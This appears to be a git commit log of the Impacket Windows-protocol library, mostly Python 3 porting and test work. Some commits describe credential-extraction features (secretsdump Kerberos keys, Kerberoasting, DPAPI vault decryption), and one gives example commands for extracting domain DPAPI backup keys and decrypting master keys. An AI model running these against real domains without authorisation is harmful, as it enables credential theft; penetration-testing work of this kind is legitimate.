    I noticed there is a test case exists for MS-EVEN, but the actual interface implementation is missing. Therefore, here's an implementation of most functions.
    One thing I couldn't figure out is the definition of ElfrReportEventW.  "Strings" parameter should be an array of unicode strings set to size "NumStrings" parameter. If you could have a look and help me define it correctly.
    Thanks!

commit b2f5337b559a79c379aeba7625cf68c5462bd236
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 10 10:14:16 2018 -0300

    Calling coverage through python

commit a43e434214ece7e8c343a33820d8c43b0a3262a4
Merge: f34153fa 0041cddd
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Dec 7 13:37:14 2018 -0300

    Merge pull request #540 from infinnovation-dev/main2unit36
    
    Convert __main__ tests into unit tests (bis)

commit f34153fac9495a30cf70b18ba5dbb00ae1c2cfab
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 7 13:27:37 2018 -0300

    Keeping backwards compatibility and returning str() when processing name/qname

commit 0041cddd970859f9290716e56727799134abda48
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Thu Dec 6 21:54:09 2018 +0000

    tests/misc: Make runalltestcases.sh report error if test(s) fail
    
    Fix #539 for this subdirectory only

commit 0bdf9bde196ea7c12866b6f93aae98f4fbec185a
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Thu Dec 6 21:09:45 2018 +0000

    tests/misc: Python2/3 fixes in test_krb5_crypto & test_dcerpc_v5_ndr

commit fd051b9f7566de5f677445c0c5bf04b0b9b7e3bb
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Wed Dec 5 21:29:20 2018 +0000

    Remove informal tests from __main__ sections
    
    These have been converted to unit tests

commit 30f9f93f01bc60b62dc554bf622fb0853e9ae274
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Wed Dec 5 20:46:34 2018 +0000

    tests: Run misc tests instead of __main__ in related modules

commit 50d5826c7eeceef284e05abb5b74a6596a60aa90
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Wed Dec 5 20:30:13 2018 +0000

    tests: Add misc/test_dcerpc_v5_ndr

commit 45427f72dd98119b9752fa3dde703cf1dbc3e148
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Tue Dec 4 22:00:48 2018 +0000

    tests: Add misc/test_dns

commit 2258b10f4fe7136d32d29cfba4dfdb460491f74d
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Tue Dec 4 22:00:26 2018 +0000

    tests: Add misc/test_ip6_address

commit f09b9a69be40b59aa753a49823c0649213c54f82
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Tue Dec 4 19:43:23 2018 +0000

    tests: Add misc/test_krb5_crypto

commit b4ba401c90920a07e1a40bd413beca56ef9218f9
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Tue Dec 4 18:48:26 2018 +0000

    tests: Add misc/test_structure

commit 579138ff3f8d9f85fe994202d2297a912142d393
Author: Colin Hogben <colin@infinnovation.co.uk>
Date:   Mon Dec 3 22:56:23 2018 +0000

    tests: Add misc/test_crypto

commit 5e66258038fc17f79e434df80893087ef5e1778d
Merge: e072ef9c 0c67b6e9
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 6 11:33:32 2018 -0300

    Merge branch 'master' into python36

commit e072ef9ce593b149bcecf151ba475af7c1dbe6f1
Author: asolino <bethus@gmail.com>
Date:   Thu Dec 6 11:33:19 2018 -0300

    Adding Python 3.6 support

commit 0c67b6e9776f5bca0cfe7fd057539f1fc09e2365
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 16:10:08 2018 -0300

    And back to dev version :)

commit 462449c1bc774d725b38f31d4fa32ec7dfaac22e
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 15:09:01 2018 -0300

    About to release

commit 1c21a460ae1f8d20e7c35c2d4b123800472feeb3
Merge: 553881b9 16748f5a
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 14:41:11 2018 -0300

    Merge branch 'master' into python36

commit 16748f5a7a1e7a40be7d745ba22aa983414df9d1
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 14:39:09 2018 -0300

    Fixing wrong test cases location in DCERPC modules's header

commit 1ad2683592bc6c7b7dc46e193e56b41b3f7dda40
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 14:34:58 2018 -0300

    Changing Copyright notice

commit 553881b9da7ee18846782fc6697559c10e655233
Merge: 7589c6af c328de82
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 12:16:54 2018 -0300

    Merge branch 'master' into python36

commit c328de825265df12ced44d14b36c688cd9973f5c
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 12:14:55 2018 -0300

    Changing Copyright notice

commit 7589c6af2866bc292ae8eecfc9f9c376f44994da
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 11:56:14 2018 -0300

    Fixing specific Python3 issues

commit a9bec39344330c20ad66e8d163ee41129f9764b2
Merge: 3c3d7be7 13a65706
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 11:52:37 2018 -0300

    Merge branch 'master' into python36

commit 13a65706273680c297caee0211460ef7369aa8ca
Merge: c4d60b3b bb6ffb37
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 11:45:45 2018 -0300

    Merge branch 'MrAnde7son-patch-7'

commit bb6ffb3707f0b531d3968cbc2e85e2f8d39c3b09
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 11:44:54 2018 -0300

    Small adjustments
    
    - Making it Python3 friendly (needs more tests)
    - Simplyfing use of Structure
    - Ask for password if not supplied

commit 3c3d7be748805d43ea3fcde79015f04166a874a6
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 10:46:32 2018 -0300

    Adding / removing new line at the end of files

commit 6e4d73641d2cc8369642f396b9d38d54f0d13552
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Dec 5 13:05:52 2018 +0200

    Update dpapi.py

commit c67b7cb5435675b009d9bd90fd9acfcb1061805a
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Dec 5 13:00:54 2018 +0200

    masterkeys decryption using domain backupkey
    
    Hola,
    I added support for domain backup keys extraction for the use of master keys decryption (huge thanks and credit to @gentilkiwi)
    Example:
    # Extract domain backup keys
    dpapi.py -debug backupkeys -t domain/user:password@DC --export
    
    # decrypt master key using PVK file
    dpapi.py masterkey -file 8ef4fb99-bb78-4592-b989-303c4aea5554 -pvk G$BCKUPKEY_E63DFF3E-CB30-41AF-AB69-FF7B8769C39B.pvk

commit 22df3574c97dc78b8e983e4494c6c9940e7217c6
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 4 17:33:47 2018 -0300

    Fixing unicode error in Python3

commit 985746b20a686a9bd47472a6cb33ddd32531ba52
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 4 17:18:22 2018 -0300

    Adding lost my_gcd function

commit 7eeff437c764a2e1c88d761d41ccaef169b6ce58
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 4 17:07:52 2018 -0300

    More code cleanup homework
    
    - Optimizing imports
    - Removing unused variables
    - Still a lot to do.
    - Test cases passing OK

commit 3202da4a1f4191129419ab16a3377e654bf28186
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 4 14:54:43 2018 -0300

    Fixing testcase for Python3

commit ec77ea3d069ed5725504aa9896694188cdb092f6
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 4 14:47:16 2018 -0300

    Code cleanup homework
    
    - Optimizing imports
    - Removing unused variables
    - Still a lot to do.
    - Test cases passing OK

commit f154b9cbd241bb343bcf952ea6f16b40170127ff
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 4 13:27:14 2018 -0300

    Ignoring some errors we don't want to check

commit d7b6ba669a7b13743dbaaf4941a42cd6b1a780af
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 3 14:16:27 2018 -0300

    Fixing two test cases failing in Python36

commit c6a18bdffaf579c1d7dbfead6fde277399add9d8
Merge: 47f67915 c4d60b3b
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 09:57:06 2018 -0300

    Merge branch 'master' into python36

commit c4d60b3b29239b54628935c29e3c710ac25f288b
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 09:42:28 2018 -0300

    Documentation for helper functions

commit 47f67915203b4901e47cbc6d9320a8c666b85f2d
Merge: 9d0d7522 5723ad39
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 09:11:58 2018 -0300

    Merge branch 'master' into python36

commit 5723ad399d477035848dff0f44b35da26963f2ec
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 09:11:30 2018 -0300

    bytesNeeded must be calculated inside the exception

commit 9d0d752253b11ad8122ef44a49716b7031fdba99
Merge: dda9b667 5f77083d
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 09:02:59 2018 -0300

    Merge branch 'master' into python36

commit 5f77083df032a8fe142ee26cc076c6d6e49d42e3
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 09:02:35 2018 -0300

    Fixing minor bug in testcase

commit dda9b667dfd338e0e4056ebacc220747d4bffd11
Merge: 587482e0 862451a7
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 08:56:51 2018 -0300

    Merge branch 'master' into python36

commit 587482e0f7175fa8cb542aae3df7e53802c4c637
Merge: c8430202 1e08690c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Dec 2 08:48:49 2018 -0300

    Merge pull request #533 from eldipa/Remove-Deprecated-Has-Key-Method
    
    Replace dict's has_key by in operator

commit 1e08690c5e4cb2c5ab388cded7214497b84515a8
Merge: 315579c1 c8430202
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Dec 2 08:48:17 2018 -0300

    Merge branch 'python36' into Remove-Deprecated-Has-Key-Method

commit 315579c1c4e87996236150d488672eee359f047d
Author: Martin Di Paola <martinp.dipaola@gmail.com>
Date:   Sun Dec 2 01:25:28 2018 +0000

    Replace dict's has_key by in operator
    
    Removed the deprecated has_key method of dict and replaced it by
    the 'in' operator.

commit 862451a74adc94c0b3fa414d69d7cc566e894f2d
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 1 15:30:10 2018 -0300

    Adding RPRN calls
    
    - RpcClosePrinter, RpcEnumPrinters and their helper functions

commit c8430202c3532a586799483171d5fc71139f46f5
Merge: b2861a4d ace5205e
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 30 15:50:19 2018 -0300

    Merge branch 'master' into python36

commit ace5205e9cd37a71e2855c9d50493e91bcf67c14
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 30 15:14:35 2018 -0300

    Checking string is NULL terminated

commit a656dfa737f4a7039f2a96dbea3dae56145b431b
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 30 15:12:20 2018 -0300

    Helper functions for the calls implemented

commit 6966e22513c648ac20da4cc30b9d8e9f630d04e8
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 30 14:52:31 2018 -0300

    [MS-RPRN] Interface implementation (Initial)
    
    - Just a few methods for now. Needed for @leechristensen RPRN great discovery

commit b2861a4dab7625eb64eb284a49cef47e3771acb0
Merge: 58ef9c2c 8fa94594
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 29 09:42:19 2018 -0300

    Merge pull request #531 from infinnovation-dev/wepencoder-fix
    
    Fixes for failing test_WEPEncoder on python36 branch

commit 58ef9c2c41300b4fc5a31fd2944e4f29772bd037
Merge: 99958427 47729edd
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 29 09:41:34 2018 -0300

    Merge pull request #532 from infinnovation-dev/helper-fix
    
    Fixes for failing dot11/test_helper on python36 branch

commit 47729edd0fc5cf2dfac19826a9b86e39b180c30c
Author: Colin Hogben <colin@pythontech.co.uk>
Date:   Wed Nov 28 23:05:00 2018 +0000

    helper: Fix for python2/python3 compatibility
    
    Use six to handle differences in mataclass handling.
    Avoid 'dictionary changed size during iteration' error.

commit 8fa94594f640a0dc7719d8b4f19c2112561c6c85
Author: Colin Hogben <colin@pythontech.co.uk>
Date:   Wed Nov 28 22:33:21 2018 +0000

    Dot11Crypto: Fix RC4 to be python2/python3 compatible
    
    Use bytearray for consistent indexing behaviour.
    Also fix a failing test in test_WEPEncoder.py by using unhexlify.

commit 99958427a59b9b4291ed645489873f0da36c663a
Merge: cf903d32 06968c16
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Nov 28 13:27:58 2018 -0300

    Merge pull request #530 from cclauss/eliminate-undefined-name__spec__
    
    Eliminate undefined name  spec

commit cf903d329985b697052d73c81b825cad1a7bb76a
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 27 11:27:57 2018 -0300

    Omitting .tox directories

commit 940b0d6094eed09319ea205e05411eb05adadea4
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 27 11:22:24 2018 -0300

    Launching test_nrpc.py automatically with the rest of the tests
    
    - dcetests.cfg was modified adding machine account data

commit 06968c1610a8591fe176f1a45e960681ab6ba22f
Author: cclauss <cclauss@bluewin.ch>
Date:   Tue Nov 27 14:50:27 2018 +0100

    Eliminate undefined name __spec__ on Python 2

commit 0d8fcd4b875ec71a976603aaebd063dfcb20207c
Author: asolino <bethus@gmail.com>
Date:   Sat Nov 24 10:31:13 2018 -0300

    Convert tabs to spaces

commit 34e4574930490c66f2ccd44d0189aa0dc03a4a92
Merge: 518bc038 93f9992d
Author: asolino <bethus@gmail.com>
Date:   Sat Nov 24 10:28:47 2018 -0300

    Merge branch 'cclauss-more-py3-fixes' into python36

commit 93f9992d7cf7c2dea31e773fb4d399ebd973b613
Author: cclauss <cclauss@bluewin.ch>
Date:   Sat Nov 24 00:37:52 2018 +0100

    flake8 . --ignore=E1,E2,E3,W293

commit d225ea10b5f5e0eab70727f683c42efe062e6bf5
Author: cclauss <cclauss@bluewin.ch>
Date:   Sat Nov 24 00:30:31 2018 +0100

    flake8 . --ignore=E1,E2,E3

commit fefb28c16a226be58b06e79bbba5518b84db91b3
Author: cclauss <cclauss@bluewin.ch>
Date:   Sat Nov 24 00:25:49 2018 +0100

    flake8 --ignore=E1,E2

commit cbed78f7b498181a9d877c22671f86edc809bb7b
Author: cclauss <cclauss@bluewin.ch>
Date:   Sat Nov 24 00:20:14 2018 +0100

    flake8 --ignore=E2

commit 80506c1620c665882ffa043f5451ef8b0cef48f3
Author: cclauss <cclauss@bluewin.ch>
Date:   Sat Nov 24 00:06:49 2018 +0100

    Fix more Python 3 issues

commit 518bc038d4982add186d4ba097604a66fafb6103
Merge: 46f79aab c6e7e378
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Nov 23 15:40:07 2018 -0300

    Merge pull request #527 from cclauss/patch-1
    
    Old style exception on Py3 branch

commit 46f79aab15164b4c469b512319021edec787414f
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 23 15:39:39 2018 -0300

    Python3 port for test_secretsdump.py

commit e83dc2de171fb43004c0543bf851c0426cc158d8
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 23 15:39:01 2018 -0300

    Print Python version being used

commit fa758dfab8fd1eb0b0c995ad82bd172864d338fe
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 23 15:38:29 2018 -0300

    Calling coverage through python instead of just running the exec

commit c6e7e378ebe6024f605ca376d051cb24f35d8b95
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 19:38:28 2018 +0100

    Use feature detection instead of version detection
    
    Python porting best practice: https://docs.python.org/3/howto/pyporting.html#use-feature-detection-instead-of-version-detection

commit b6a37ae56356c1376d52349f8f2c900d50cf1b77
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 19:35:16 2018 +0100

    Use repr(value) instead of `value`for Python 3

commit cd6bcd0628ceceb9f9e0faa45febb93e1f62bbd0
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 19:29:26 2018 +0100

    Old style exceptions --> new style

commit 781178227a5e966c04f2e6cc1266da44cd6b4b84
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 19:25:59 2018 +0100

    Use print() function in both Python 2 and Python 3

commit fd5f464895f237dcbc2d215750783e3c879194be
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 19:20:02 2018 +0100

    Undefined name: loggin --> logging

commit 01827369e8a7fdc236b6a813a745bac86971d775
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 19:02:00 2018 +0100

    Old style exception on Py3 branch

commit df591c2fbfb2d8fabf947ec7f1d582e14844527d
Merge: 7887c5a3 76cf9569
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 23 09:17:08 2018 -0300

    Merge branch 'master' into python36

commit 76cf9569306f555ed53a94bdfee638686bc74ee7
Merge: 5adeffca 7f026f29
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Nov 23 09:08:25 2018 -0300

    Merge pull request #525 from cclauss/patch-3
    
    Travis CI: Add flake8 to find syntax errors and undefined names

commit 5adeffca811b7c3cc470ef43c7a1f4e221f81431
Merge: 22d332ac 41666731
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Nov 23 09:03:22 2018 -0300

    Merge pull request #524 from cclauss/patch-1
    
    Use print() function in examples/ping6.py

commit 7f026f291a828479f65e51d5967f1ae25303737b
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 11:15:57 2018 +0100

    Travis CI: Add flake8 to find syntax errors and undefined names
    
    Test on both Python 2.7 and 3.6 and add flake8 to find find syntax errors and undefined names.  Run the Python 3 tests in __allow_failures__ mode until the __python36__ branch is merged.
    
    
    __E901,E999,F821,F822,F823__ are the "_showstopper_" [flake8](http://flake8.pycqa.org) issues that can halt the runtime with a SyntaxError, NameError, etc. Most other flake8 issues are merely "style violations" -- useful for readability but they do not effect runtime safety.
    * F821: undefined name `name`
    * F822: undefined name `name` in `__all__`
    * F823: local variable name referenced before assignment
    * E901: SyntaxError or IndentationError
    * E999: SyntaxError -- failed to compile a file into an Abstract Syntax Tree

commit 416667316ad06242fb82c0d0b664c13ef5cd4ef1
Author: cclauss <cclauss@bluewin.ch>
Date:   Thu Nov 22 19:01:34 2018 +0100

    Use print() function in examples/ping6.py

commit 7887c5a360c485cd9131b7b5a20b936b55ce4325
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 16:45:53 2018 -0300

    Fixing some py36 errors
    
    - Thanks @dirkjanm for bringing them up

commit 98bdbeb95d620e506a2ef89447da3f10419b0a7c
Merge: c017dd06 22d332ac
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 16:08:27 2018 -0300

    Merge branch 'master' into python36

commit 22d332acac1e7a41e030b7ee25eda4b0bbd753e1
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 15:42:20 2018 -0300

    Fixing some errors generated by flake8
    
    - Should address the remaining cases for https://github.com/SecureAuthCorp/impacket/issues/494

commit 32778d507acc82d11082bcaad65407d79428c106
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 15:32:56 2018 -0300

    Removing deprecated/old code.

commit c017dd068ec0c23682a405fb02bcdbf9aede0991
Merge: 6d06423f 59bb4b56
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 15:10:07 2018 -0300

    Merge branch 'master' into python36

commit 59bb4b56ddbec841d791813abf899dd2477099e0
Merge: 61d24d71 23c21569
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 15:09:27 2018 -0300

    Merge branch 'MrAnde7son-patch-5'

commit 23c215691640e0a5d668399d98f89014816be59c
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 15:09:10 2018 -0300

    Fixing test case

commit ac7664382148c1a1162ca2ef2f089e6119cc99fc
Merge: ca456a45 2dbaf8b0
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 15:06:09 2018 -0300

    Merge branch 'patch-5' of https://github.com/MrAnde7son/impacket into MrAnde7son-patch-5

commit 6d06423f066adb94bc03e2ccd7e616a4f9328f7b
Merge: a22809a4 61d24d71
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 14:50:57 2018 -0300

    Merge branch 'master' into python36

commit 61d24d713c380761a226733b1498905a98ccbe84
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 12:58:59 2018 -0300

    Start the RemoteRegistry services if not enabled by default

commit eae5d8a51a843eb1f49c7fd61053f26946600fb7
Merge: 6c9f7b8f ebaec624
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 12:32:38 2018 -0300

    Merge branch 'infinnovation-dev-ci'

commit ebaec6241914a595b04bb93f4bce8f2194803b01
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 12:31:25 2018 -0300

    Minor adjustements
    
    - Changing NO_DCE to NO_REMOTE since that is what we're limiting (there are NON DCE Remote tests that aren't ran, i.e. test_smb).
    - Put some test that do not require remote interaction to run (i.e. test_spnego)

commit 82bdb87e3acdecdbd70186f1a443c438161ff0cc
Merge: 6c9f7b8f 073782ea
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 12:07:50 2018 -0300

    Merge branch 'ci' of https://github.com/infinnovation-dev/impacket into infinnovation-dev-ci

commit a22809a46fbf0168db0ce9162e6b6ece755251b7
Merge: 4446728b 6c9f7b8f
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 10:58:42 2018 -0300

    Merge branch 'master' into python36

commit 6c9f7b8f2835f8bd6714411c857aeee1e86f2f46
Merge: 60741b8e e3f9780c
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 10:34:17 2018 -0300

    Merge branch 'fox-it-krbkeys-master'

commit e3f9780c5241bd14749b5866d9288c420de36ab1
Merge: 60741b8e d519d170
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 10:26:10 2018 -0300

    Merge branch 'krbkeys-master' of https://github.com/fox-it/impacket into fox-it-krbkeys-master

commit 073782ea0f820d78c4186fa48cfb99d09706c7b9
Author: Colin Hogben <colin@pythontech.co.uk>
Date:   Mon Nov 19 19:49:27 2018 +0000

    Add configuration to run the tox tests using travis-ci
    
    A basic .travis.yml file is added.  Additionally, tox.ini and
    runall.sh are modified to enable passing a "NO_DCE" environment
    variable.  This allows skipping the tests which require a Windows 2012
    R2 Domain Controller, which is not available in travis-ci.

commit 4446728b2ddbfa10e69a9c3c3b462d37508403fa
Merge: a974603c 60741b8e
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 19 15:55:27 2018 -0300

    Merge branch 'master' into python36

commit 60741b8e66c6f0a4d90efa9f75a2f8ccb0a95bc1
Merge: 12e36349 977ae7b8
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Nov 19 15:54:28 2018 -0300

    Merge pull request #521 from fox-it/kerberoast-trust
    
    Bugfixes and cross-domain support in GetUserSPNs.py

commit a974603cd95db931570705caa529749c0446a590
Merge: 19334ddf 12e36349
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 19 13:03:21 2018 -0300

    Merge branch 'master' into python36

commit 12e363497161d771c32fe9c0c967181647dcaaeb
Merge: bca1174b 1e58c88a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Nov 19 13:02:54 2018 -0300

    Merge pull request #516 from cclauss/patch-1
    
    Use print() function in examples/ping.py

commit 19334ddf542d036f13bd5ae1ac46acc0ef91d6c2
Merge: 8a683396 bca1174b
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 19 12:30:38 2018 -0300

    Merge branch 'master' into python36

commit bca1174b2679cf78bbd5200b2a3a749f77d89996
Merge: 5db95012 3f29d8dc
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Nov 19 12:24:37 2018 -0300

    Merge pull request #518 from vszakats/urlfix
    
    fix/secure URLs

commit 5db950121488984b3daadca5b5048b6e902904af
Merge: f9890ec9 638532d1
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Nov 19 10:04:35 2018 -0300

    Merge pull request #517 from vszakats/patch-1
    
    LICENSE: use HTTPS links

commit 3f29d8dcdbff92f94d1f0042074eb5a2f3dacfe7
Author: Viktor Szakats <commit@vszakats.net>
Date:   Fri Nov 16 12:53:38 2018 +0000

    fix/secure URLs
    
    * also remove/fix some whitespace such as tabs
      and spaces at EOL

commit f9890ec9cedb17ca5834169c0138850de01a6179
Author: asolino <bethus@gmail.com>
Date:   Sun Nov 18 11:26:33 2018 -0300

    Do not encrypt if anonymous connections is established
    
    Should address https://github.com/SecureAuthCorp/impacket/issues/520

commit 977ae7b8d3374266bb1f04677e0a11726d92a264
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Nov 17 14:59:29 2018 +0100

    Bugfixes and cross-domain support in GetUserSPNs.py

commit d519d1700f2eb71a0a43ab908733b3031ac5958f
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Nov 17 11:10:17 2018 +0100

    Added dumping of machine account Kerberos keys to secretsdump

commit 638532d1af798b8456109ed4abc685c57c5b8657
Author: Viktor Szakats <vszakats@users.noreply.github.com>
Date:   Fri Nov 16 13:02:21 2018 +0100

    LICENSE: use HTTPS links

commit 1e58c88a0d466cd7c1b702b638fcdd4ceada094b
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 16 12:25:12 2018 +0100

    Use print() function in examples/ping.py

commit 8a6833967ee55b1e6ade3d37a701e087bebd09fa
Merge: a43ab5f5 41cd725d
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 13 15:26:50 2018 -0300

    Merge branch 'master' into python36

commit 41cd725d7d76e502d74ae15a77ab5d27ff6bd172
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 13 15:25:56 2018 -0300

    Adding NGC_LOCAL_ACCOOUNT local accoount structure
    
    - Have fun :)

commit a43ab5f5e01b46d5ebb3cf210e2eed8ba073c4eb
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 13 14:57:03 2018 -0300

    Fix configparser Py2 error

commit febc5dae85009a0f113a9cbf0e9ebbcdcee3e322
Author: imaibou <ai_bounab@esi.dz>
Date:   Sun Nov 11 00:07:49 2018 +0100

    added GetInterestingFiles.py example script
    
    Created script to search programmatically for interest files on a network share. The search is based on the remote file name and the search criteria can be changed by the pentester.

commit 98b0ae0ddf67a6803f716a036401250f11ab7b3a
Merge: 88f31141 a5086558
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 8 12:48:22 2018 -0300

    Merge branch 'master' into python36

commit a50865582791990bf7e27c7cf769fb6710f5105c
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 8 12:47:32 2018 -0300

    Parsing DPAPI_SYSTEM according to the new changes just introduced in secretsdump

commit 88f31141fe5789befb9a58e523b5395903b601fa
Merge: 25acb58a 927803ef
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 8 12:31:20 2018 -0300

    Merge branch 'master' into python36

commit 927803ef60dfd296004dab47b77fac6bd4374b3d
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 8 12:30:04 2018 -0300

    Now DPAPI keys are parsed and shown as user and machine keys
    
    So you can later on use them with dpapi.py example (or any other tool)

commit b75d710e5603a0f8ae40be941dc2229b9a377530
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 8 12:25:30 2018 -0300

    Adding DPAPI / Vaults related structures, testcase and example.
    
    You can unlock masterkeys, credentials and vaults. For the three, you will specify the file name (using -file for
    masterkeys and credentials, and -vpol and -vcrd for vaults).
    If no other parameter is sent, the contents of these resource will be shown, with their encrypted data as well.
    If you specify a -key blob (in the form of '0xabcdef...') that key will be used to decrypt the contents.
    In the case of vaults, you might need to also provide the user's sid (and the user password will be asked).
    For system secrets, instead of a password you will need to specify the system and security hives.
    
    References: All of the work done by these guys. I just adapted their work to my needs.
    https://www.passcape.com/index.php?section=docsys&cmd=details&id=28
    https://github.com/jordanbtucker/dpapick
    https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials (and everything else Ben did )
    http://blog.digital-forensics.it/2016/01/windows-revaulting.html
    https://www.passcape.com/windows_password_recovery_vault_explorer
    https://www.passcape.com/windows_password_recovery_dpapi_master_key

commit 25acb58a52a408fd55e74edfc32adb9d61ba4a82
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 31 11:03:50 2018 -0300

    If hexdump() received None, return

commit 748a44c47c516cedcfaeaa3982d3af5e9ec99ba7
Merge: 4a1a9071 46ffda63
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 24 18:25:25 2018 -0300

    Merge branch 'master' into python36

commit 46ffda630f9191be6a04e378d28031d49e20fd02
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 24 18:22:25 2018 -0300

    Do not assume the target SMB3 server supports encryption
    
    - Check if the server confirmed encryption capabilities returned in the negotiate packet.
    - This was breaking a SOCKs proxy relay use case (https://github.com/SecureAuthCorp/impacket/issues/509)

commit 4a1a90718e3a1cf89254c4f19185a4293f8bde35
Merge: fdf550a9 ff658d5c
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 24 13:43:28 2018 -0300

    Merge branch 'master' into python36

commit ff658d5cc2a6299cdf157152bba5ee622003ed7a
Merge: 9efa50fe 074708af
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Oct 24 13:43:01 2018 -0300

    Merge pull request #510 from cauan/patch-1
    
    Update secretsdump.py

commit 074708afc76866ff9e887681d2b08fbcf8a9cb7c
Author: Cauan <cauan@users.noreply.github.com>
Date:   Wed Oct 24 13:29:28 2018 -0300

    Update secretsdump.py
    
    Set remoteName instead of address in case the password contains '@'

commit fdf550a9a5f36b3b617a038be76247a7f3c24d52
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 24 11:57:04 2018 -0300

    Removing stacktrace print

commit 9adc58b9abc7bf12a00e03caa78affa317c2ffed
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 24 11:49:35 2018 -0300

